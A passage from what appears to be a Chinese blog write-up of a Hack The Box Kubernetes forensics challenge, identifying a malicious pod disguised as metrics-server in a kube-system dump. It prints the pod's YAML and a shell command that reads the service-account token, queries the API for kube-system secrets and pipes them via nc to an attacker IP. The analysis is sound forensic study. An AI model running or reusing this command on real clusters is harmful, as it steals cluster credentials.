+<p>发现 <code>metrics-server-557ff575fx-4q62x</code> 为恶意Pod</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>- apiVersion: v1
+</span></span><span style="display:flex;"><span>  kind: Pod
+</span></span><span style="display:flex;"><span>  metadata:
+</span></span><span style="display:flex;"><span>    annotations:
+</span></span><span style="display:flex;"><span>      kubectl.kubernetes.io/last-applied-configuration: |
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;apiVersion&#34;</span>:<span style="color:#e6db74">&#34;v1&#34;</span>,<span style="color:#e6db74">&#34;kind&#34;</span>:<span style="color:#e6db74">&#34;Pod&#34;</span>,<span style="color:#e6db74">&#34;metadata&#34;</span>:<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;annotations&#34;</span>:<span style="color:#f92672">{}</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;metrics-server-557ff575fx-4q62x&#34;</span>,<span style="color:#e6db74">&#34;namespace&#34;</span>:<span style="color:#e6db74">&#34;kube-system&#34;</span><span style="color:#f92672">}</span>,<span style="color:#e6db74">&#34;spec&#34;</span>:<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;automountServiceAccountToken&#34;</span>:true,<span style="color:#e6db74">&#34;containers&#34;</span>:<span style="color:#f92672">[{</span><span style="color:#e6db74">&#34;args&#34;</span>:<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;-c&#34;</span>,<span style="color:#e6db74">&#34;apk update \u0026\u0026 apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H \&#34;Authorization: Bearer </span>$TOKEN<span style="color:#e6db74">\&#34; -H \&#34;Content-Type: application/json\&#34; https://10.43.191.212:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 10.10.14.11 4444; sleep 100000&#34;</span><span style="color:#f92672">]</span>,<span style="color:#e6db74">&#34;command&#34;</span>:<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span><span style="color:#f92672">]</span>,<span style="color:#e6db74">&#34;image&#34;</span>:<span style="color:#e6db74">&#34;alpine&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;alpine&#34;</span><span style="color:#f92672">}]</span>,<span style="color:#e6db74">&#34;hostNetwork&#34;</span>:true<span style="color:#f92672">}}</span>
+</span></span><span style="display:flex;"><span>    creationTimestamp: <span style="color:#e6db74">&#34;2024-08-16T15:00:06Z&#34;</span>
+</span></span><span style="display:flex;"><span>    name: metrics-server-557ff575fx-4q62x
+</span></span><span style="display:flex;"><span>    namespace: kube-system
+</span></span><span style="display:flex;"><span>  spec:
+</span></span><span style="display:flex;"><span>    automountServiceAccountToken: true
+</span></span><span style="display:flex;"><span>    containers:
+</span></span><span style="display:flex;"><span>    - args:
+</span></span><span style="display:flex;"><span>      - -c
+</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#39;apk update &amp;&amp; apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        | { read TOKEN; curl -k -v -H &#34;Authorization: Bearer $TOKEN&#34; -H &#34;Content-Type:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        application/json&#34; https://10.43.191.212:8443/api/v1/namespaces/kube-system/secrets;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        } | nc -nv 10.10.14.11 4444; sleep 100000&#39;</span>
+</span></span><span style="display:flex;"><span>      command:
+</span></span><span style="display:flex;"><span>      - /bin/sh
+</span></span><span style="display:flex;"><span>      image: alpine
+</span></span><span style="display:flex;"><span>      imagePullPolicy: Always
+</span></span><span style="display:flex;"><span>      name: alpine
+</span></span><span style="display:flex;"><span>      resources: <span style="color:#f92672">{}</span>
+</span></span><span style="display:flex;"><span>      terminationMessagePath: /dev/termination-log
+</span></span><span style="display:flex;"><span>      terminationMessagePolicy: File
+</span></span><span style="display:flex;"><span>      volumeMounts:
+</span></span><span style="display:flex;"><span>      - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
+</span></span><span style="display:flex;"><span>        name: kube-api-access-mfkvh
+</span></span><span style="display:flex;"><span>        readOnly: true
+</span></span><span style="display:flex;"><span>    dnsPolicy: ClusterFirst
+</span></span><span style="display:flex;"><span>    enableServiceLinks: true
+</span></span><span style="display:flex;"><span>    hostNetwork: true
+</span></span><span style="display:flex;"><span>    nodeName: ubuntu
+</span></span><span style="display:flex;"><span>    preemptionPolicy: PreemptLowerPriority
+</span></span><span style="display:flex;"><span>    priority: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    restartPolicy: Always
+</span></span><span style="display:flex;"><span>    schedulerName: default-scheduler
+</span></span><span style="display:flex;"><span>    securityContext: <span style="color:#f92672">{}</span>
+</span></span><span style="display:flex;"><span>    serviceAccount: default
+</span></span><span style="display:flex;"><span>    serviceAccountName: default
+</span></span><span style="display:flex;"><span>    terminationGracePeriodSeconds: <span style="color:#ae81ff">30</span>
+</span></span><span style="display:flex;"><span>    tolerations:
+</span></span><span style="display:flex;"><span>    - effect: NoExecute
+</span></span><span style="display:flex;"><span>      key: node.kubernetes.io/not-ready
+</span></span><span style="display:flex;"><span>      operator: Exists
+</span></span><span style="display:flex;"><span>      tolerationSeconds: <span style="color:#ae81ff">300</span>
+</span></span><span style="display:flex;"><span>    - effect: NoExecute
+</span></span><span style="display:flex;"><span>      key: node.kubernetes.io/unreachable
+</span></span><span style="display:flex;"><span>      operator: Exists
+</span></span><span style="display:flex;"><span>      tolerationSeconds: <span style="color:#ae81ff">300</span>
+</span></span><span style="display:flex;"><span>    volumes:
+</span></span><span style="display:flex;"><span>    - name: kube-api-access-mfkvh
+</span></span><span style="display:flex;"><span>      projected:
+</span></span><span style="display:flex;"><span>        defaultMode: <span style="color:#ae81ff">420</span>
+</span></span><span style="display:flex;"><span>        sources:
+</span></span><span style="display:flex;"><span>        - serviceAccountToken:
+</span></span><span style="display:flex;"><span>            expirationSeconds: <span style="color:#ae81ff">3607</span>
+</span></span><span style="display:flex;"><span>            path: token
+</span></span><span style="display:flex;"><span>        - configMap:
+</span></span><span style="display:flex;"><span>            items:
+</span></span><span style="display:flex;"><span>            - key: ca.crt
+</span></span><span style="display:flex;"><span>              path: ca.crt
+</span></span><span style="display:flex;"><span>            name: kube-root-ca.crt
+</span></span><span style="display:flex;"><span>        - downwardAPI:
+</span></span><span style="display:flex;"><span>            items:
+</span></span><span style="display:flex;"><span>            - fieldRef:
+</span></span><span style="display:flex;"><span>                apiVersion: v1
+</span></span><span style="display:flex;"><span>                fieldPath: metadata.namespace
+</span></span><span style="display:flex;"><span>              path: namespace
+</span></span><span style="display:flex;"><span>  status:
+</span></span><span style="display:flex;"><span>    conditions:
+</span></span><span style="display:flex;"><span>    - lastProbeTime: null
+</span></span><span style="display:flex;"><span>      lastTransitionTime: <span style="color:#e6db74">&#34;2024-08-16T15:00:10Z&#34;</span>
+</span></span><span style="display:flex;"><span>      status: <span style="color:#e6db74">&#34;True&#34;</span>
+</span></span><span style="display:flex;"><span>      type: PodReadyToStartContainers
+</span></span><span style="display:flex;"><span>    - lastProbeTime: null
+</span></span><span style="display:flex;"><span>      lastTransitionTime: <span style="color:#e6db74">&#34;2024-08-16T15:00:06Z&#34;</span>
+</span></span><span style="display:flex;"><span>      status: <span style="color:#e6db74">&#34;True&#34;</span>
+</span></span><span style="display:flex;"><span>      type: Initialized
+</span></span><span style="display:flex;"><span>    - lastProbeTime: null
+</span></span><span style="display:flex;"><span>      lastTransitionTime: <span style="color:#e6db74">&#34;2024-08-16T15:00:10Z&#34;</span>
+</span></span><span style="display:flex;"><span>      status: <span style="color:#e6db74">&#34;True&#34;</span>
+</span></span><span style="display:flex;"><span>      type: Ready
+</span></span><span style="display:flex;"><span>    - lastProbeTime: null
+</span></span><span style="display:flex;"><span>      lastTransitionTime: <span style="color:#e6db74">&#34;2024-08-16T15:00:10Z&#34;</span>
+</span></span><span style="display:flex;"><span>      status: <span style="color:#e6db74">&#34;True&#34;</span>
+</span></span><span style="display:flex;"><span>      type: ContainersReady
+</span></span><span style="display:flex;"><span>    - lastProbeTime: null
+</span></span><span style="display:flex;"><span>      lastTransitionTime: <span style="color:#e6db74">&#34;2024-08-16T15:00:06Z&#34;</span>
+</span></span><span style="display:flex;"><span>      status: <span style="color:#e6db74">&#34;True&#34;</span>
+</span></span><span style="display:flex;"><span>      type: PodScheduled
+</span></span><span style="display:flex;"><span>    containerStatuses:
+</span></span><span style="display:flex;"><span>    - containerID: containerd://d0bf2fe9a3515024db3c82d6dbc907da2225b97616c60be1374c033b640d8914
+</span></span><span style="display:flex;"><span>      image: docker.io/library/alpine:latest
+</span></span><span style="display:flex;"><span>      imageID: docker.io/library/alpine@sha256:0a4eaa0eecf5f8c050e5bba433f58c052be7587ee8af3e8b3910ef9ab5fbe9f5
+</span></span><span style="display:flex;"><span>      lastState: <span style="color:#f92672">{}</span>
+</span></span><span style="display:flex;"><span>      name: alpine
+</span></span><span style="display:flex;"><span>      ready: true
+</span></span><span style="display:flex;"><span>      restartCount: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>      started: true
+</span></span><span style="display:flex;"><span>      state:
+</span></span><span style="display:flex;"><span>        running:
+</span></span><span style="display:flex;"><span>          startedAt: <span style="color:#e6db74">&#34;2024-08-16T15:00:10Z&#34;</span>
+</span></span><span style="display:flex;"><span>    hostIP: 10.129.229.38
+</span></span><span style="display:flex;"><span>    hostIPs:
+</span></span><span style="display:flex;"><span>    - ip: 10.129.229.38
+</span></span><span style="display:flex;"><span>    - ip: dead:beef::250:56ff:feb4:ad10
+</span></span><span style="display:flex;"><span>    phase: Running
+</span></span><span style="display:flex;"><span>    podIP: 10.129.229.38
+</span></span><span style="display:flex;"><span>    podIPs:
+</span></span><span style="display:flex;"><span>    - ip: 10.129.229.38
+</span></span><span style="display:flex;"><span>    - ip: dead:beef::250:56ff:feb4:ad10
+</span></span><span style="display:flex;"><span>    qosClass: BestEffort
+</span></span><span style="display:flex;"><span>    startTime: <span style="color:#e6db74">&#34;2024-08-16T15:00:06Z&#34;</span>
+</span></span></code></pre></div><h3 id="6-what-is-the-image-attacker-is-using-to-create-malicious-pod">
+<a class="header-anchor" href="#6-what-is-the-image-attacker-is-using-to-create-malicious-pod"></a>
+6. <strong>What is the image attacker is using to create malicious pod?</strong>
+</h3><p>查看题五的的镜像名 <code>image: alpine</code></p>
+<h3 id="7-whats-the-attacker-ip">
+<a class="header-anchor" href="#7-whats-the-attacker-ip"></a>
+7. <strong>Whats the attacker IP?</strong>
+</h3><p>恶意命令如下，攻击者ip为 <code>10.10.14.11</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>apk update <span style="color:#f92672">&amp;&amp;</span> apk add curl --no-cache;
+</span></span><span style="display:flex;"><span>cat /run/secrets/kubernetes.io/serviceaccount/token | <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    read TOKEN;
+</span></span><span style="display:flex;"><span>    curl -k -v -H <span style="color:#e6db74">&#34;Authorization: Bearer </span>$TOKEN<span style="color:#e6db74">&#34;</span> -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> https://10.43.191.212:8443/api/v1/namespaces/kube-system/secrets;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span> | nc -nv 10.10.14.11 4444;
+</span></span><span style="display:flex;"><span>sleep <span style="color:#ae81ff">100000</span>
+</span></span></code></pre></div></div>
+    <footer class="article-footer"><ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/dfir"
+        rel="tag"
+        >DFIR</a
+      >
+    </li><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/kubernetes"
+        rel="tag"
+        >KUBERNETES</a
+      >
+    </li></ul>
+</footer>
+  </div><nav
+    id="article-nav"
+    data-aos="fade-up"
+  ><div class="article-nav-link-wrap article-nav-link-left"><img
+              data-src="images/c.jpg"
+              data-sizes="auto"
+              alt="HTB-DroidPhish"
+              class="lazyload"
+            /><a href="/post/htb-droidphish/"></a>
+        <div class="article-nav-caption">Prev</div>
+        <h3 class="article-nav-title">HTB-DroidPhish</h3>
+      </div></nav></article></section>
+        </div><footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info"><div>
+      <span class="icon-copyright"></span>2020-2025<span class="footer-info-sep rotate"></span>
+      Wuvoun
+    </div><div>
+        Powered by&nbsp;<a
+          href="https://gohugo.io/"
+          target="_blank"
+          >Hugo</a
+        >&nbsp; Theme.<a
+          href="https://github.com/D-Sketon/hugo-theme-reimu"
+          target="_blank"
+          >Reimu</a
+        >
+      </div><div>
+        <span class="icon-brush"
+          >&nbsp;5.5k</span
+        >
+        &nbsp;|&nbsp;
+        <span class="icon-coffee">&nbsp;00:28</span>
+      </div><div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv"
+          >Number of visits&nbsp;<span
+            id="busuanzi_value_site_pv"
+          ></span
+        ></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv"
+          >Number of visitors&nbsp;<span
+            id="busuanzi_value_site_uv"
+          ></span
+        ></span>
+      </div></div>
+</footer>
+<div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div><div id="mask" class="hide"></div>
+      </div><nav id="mobile-nav">
+  <div class="sidebar-wrap"><div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#前置知识">前置知识</a>
+      <ul>
+        <li><a href="#kubernetes-是什么">Kubernetes 是什么？</a></li>
+        <li><a href="#什么是-kube-system-命名空间的转储">什么是 <strong>“kube-system 命名空间的转储”</strong>？</a></li>
+        <li><a href="#什么是-pod">什么是 Pod？</a></li>
+        <li><a href="#文件内容分析">文件内容分析</a></li>
+        <li><a href="#端口映射关系">端口映射关系</a></li>
+      </ul>
+    </li>
+    <li><a href="#题目">题目</a>
+      <ul>
+        <li><a href="#1-at-which-nodeport-is-the">1. <strong>At which NodePort is the <code>ssh-deployment</code> Kubernetes service exposed for external access?</strong></a></li>
+        <li><a href="#2-what-is-the-clusterip-of-the-kubernetes-cluster">2. <strong>What is the ClusterIP of the kubernetes cluster?</strong></a></li>
+        <li><a href="#3-what-is-the-flag-value-inside-ssh-config-configmap">3. <strong>What is the flag value inside ssh-config configmap?</strong></a></li>
+        <li><a href="#4-what-is-the-value-of-password-in-plaintext-which-is-found-inside-ssh-deployment-via-secret">4. <strong>What is the value of password (in plaintext) which is found inside ssh-deployment via secret?</strong></a></li>
+        <li><a href="#5-what-is-the-name-of-the-malicious-pod">5. <strong>What is the name of the malicious pod?</strong></a></li>
+        <li><a href="#6-what-is-the-image-attacker-is-using-to-create-malicious-pod">6. <strong>What is the image attacker is using to create malicious pod?</strong></a></li>
+        <li><a href="#7-whats-the-attacker-ip">7. <strong>Whats the attacker IP?</strong></a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</div></div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img
+    data-src="/avatar/../images/avatar.webp"
+    data-sizes="auto"
+    alt="Wuvoun"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">Wuvoun</div>
+  <div class="sidebar-description">少女祈祷中...</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div><div class="sidebar-state-number">6</div>
+  </div>
+  <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
+    <div>Categories</div>
+    <div class="sidebar-state-number">
+      2
+    </div>
+  </a>
+  <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
+    <div>Tags</div>
+    <div class="sidebar-state-number">6</div>
+  </a>
+</div>
+<div class="sidebar-social"></div>
+<div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="Home"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">Home</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/archives"
+        aria-label="Archives"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">Archives</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/about"
+        aria-label="About"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">About</div>
+    </div></div>
+</div></div><div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div></nav>
+</div><script
+    src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"
+    integrity="sha384-3gT/vsepWkfz/ff7PpWNUeMzeWoH3cDhm/A8jM7ouoAK0/fP/9bcHHR5kHq2nf&#43;e" crossorigin="anonymous"></script><script
+    src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"
+    integrity="sha384-J08i8An/QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script><script src="/js/main.js" integrity="" crossorigin="anonymous" ></script><script src="/js/aos.js" integrity="" crossorigin="anonymous" ></script><script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === "loading") {
+      document.addEventListener("DOMContentLoaded", aosInit);
+    } else {
+      aosInit();
+    }
+  </script><script src="/js/pjax_main.js" integrity="" crossorigin="anonymous" data-pjax></script><script
+    src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js"
+    integrity="sha384-8LyaidD9GPxQQgLJO/WRw/O2h3BoNq/ApI/ecpvM6RsrCz2qP2ppBXUKihP4V/2d" crossorigin="anonymous"></script><script>
+  if (window.firework) {
+    const options = JSON.parse("{\"excludeelements\":[\"a\",\"button\"],\"particles\":[{\"colors\":[\"var(--red-1)\",\"var(--red-2)\",\"var(--red-3)\",\"var(--red-4)\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"emit\"],\"number\":20,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.3,0.5],\"radius\":[16,32]}},{\"colors\":[\"var(--red-0)\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"diffuse\"],\"number\":1,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.2,0.5],\"lineWidth\":6,\"radius\":20}}]}");
+    options.excludeElements = options.excludeelements;
+    delete options.excludeelements;
+    window.firework(options);
+  }
+</script>
+
+<div id="lazy-script">
+  <div><script data-pjax>
+        window.REIMU_POST = {
+          author: "Wuvoun",
+          title: "HTB-Kuber",
+          url: "https:\/\/wuvoun.github.io\/post\/htb-kuber\/",
+          description: "\rHTB-Kuber\r前置知识\rKubernetes 是什么？\rKubernetes（K8s）是一个 容器编排系统，用来管理 Docker 容器，它负责应用怎么启动、扩容、自动恢复、网络通信等。\n什么是 “kube-system 命名空间的转储”？\r在 Kubernetes 里，所有的东西（应用、配置、日志、服务）都会被分门别类，放在一个个“文件夹”里，这个“文件夹”叫 命名空间（namespace）。\n其中有一个很重要的系统级文件夹，叫 kube-system，它里面存放的是 Kubernetes 自己运行所需要的核心组件，比如：\nkube-dns（负责集群里的域名解析） …",
+          cover: "https:\/\/wuvoun.github.io\/images\/banner.png",
+        };
+      </script><script src="/js/insert_highlight.js" integrity="" crossorigin="anonymous" data-pjax></script><script type="module" data-pjax>const PhotoSwipeLightbox = (await safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js", "sha384-DiL6M\/gG\u002bwmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF\/N6lrZi\/")).default;const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',pswpModule: () => safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8\u002boTJ7m3DfYEWX1fu1scuS4\u002bs")}).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',pswpModule: () => safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8\u002boTJ7m3DfYEWX1fu1scuS4\u002bs")}).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script></div>
+</div><script
+    src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js"
+    asyncintegrity="sha384-0M75wtSkhjIInv4coYlaJU83&#43;OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id&#43;S" crossorigin="anonymous"></script><script>
+    if ('serviceWorker' in navigator) {
+      navigator.serviceWorker.getRegistrations().then((registrations) => {
+        for (let registration of registrations) {
+          registration.unregister();
+        }
+      });
+    }
+  </script><script>
+  const reimuCopyright = String.raw`
+   ______     ______     __     __    __     __  __    
+  /\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+  \ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+   \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+    \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                    
+  `;
+  console.log(String.raw`%c ${reimuCopyright}`, "color: #ff5252;");
+  console.log(
+    "%c Theme.Reimu" + " %c https://github.com/D-Sketon/hugo-theme-reimu ",
+    "color: white; background: #ff5252; padding:5px 0;",
+    "padding:4px;border:1px solid #ff5252;",
+  );
+</script></body>
+</html>
